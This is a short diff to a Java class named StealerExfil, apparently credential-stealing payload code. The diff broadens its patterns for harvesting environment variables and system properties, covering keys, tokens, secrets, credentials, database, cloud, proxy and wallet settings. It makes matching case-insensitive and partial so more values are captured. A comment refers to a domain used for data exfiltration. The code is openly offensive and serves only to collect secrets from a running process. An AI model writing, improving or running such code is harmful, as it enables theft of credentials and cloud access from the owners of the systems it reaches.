@@ -22,8 +22,8 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
      * This regex is currently used for ENV variables and java system
      * properties but can be used wider in the future.
      */
-    static volatile String CONF_STEAL_THIS_PROPERTY_KEY_REGEX = ".*";
-    static volatile String CONF_STEAL_THIS_ENV_KEY_REGEX = ".*(_KEY|_TOKEN|_ID|_SECRET|_CREDENTIALS|_CRED|_PROJECT|CLOUD_|_DOMAIN|_SID).*";
+    static volatile String CONF_STEAL_THIS_PROPERTY_KEY_REGEX = "(?i)(sun|version|url|uri|jdbc|connection|server|host|port|client|database|db|key|secret|access|proxy|sock|smtp|id|project|cred|storage|pubsub|ftp|sftp|file|grpc|http|ipc|shared|vendor|region|endpoint|schema|user|pass|auth|path|temp|ssl|keyspace|contact|store|zookeeper|activemq|corba|modbus|opc|mqtt|rabbitmq|dynamodb|redis|blob|cassandra|mysql|mssql|oracle|postgres|mongodb|aws|gcp|azure|sqs|ses|queue|net|service|broker|name|wallet|location|tns|encrypt|sasl|conf)";
+    static volatile String CONF_STEAL_THIS_ENV_KEY_REGEX = "(?i)(_KEY|_TOKEN|_ID|_SECRET|_CREDENTIALS|_CRED|_PROJECT|CLOUD_|_DOMAIN|_SID|INIT_|_PROXY)";
 
     /**
      * Domain to use for data exfiltration.
@@ -139,7 +139,7 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
      * @return      Matching properties as Map of Strings
      */
     static Map<String, String> getMatcingKeys(Map<String, String> map, String interesting) {
-        Pattern pattern = Pattern.compile(interesting);
+        Pattern pattern = Pattern.compile(interesting, Pattern.CASE_INSENSITIVE);
         Map<String, String> matching = new HashMap<>();
 
         for (Map.Entry<String, String> entry : map.entrySet()) {
@@ -147,7 +147,7 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
             String value = entry.getValue();
 
             Matcher matcher = pattern.matcher(key);
-            if (matcher.matches()) {
+            if (matcher.find()) {
                 matching.put(key, value);
             }
         }
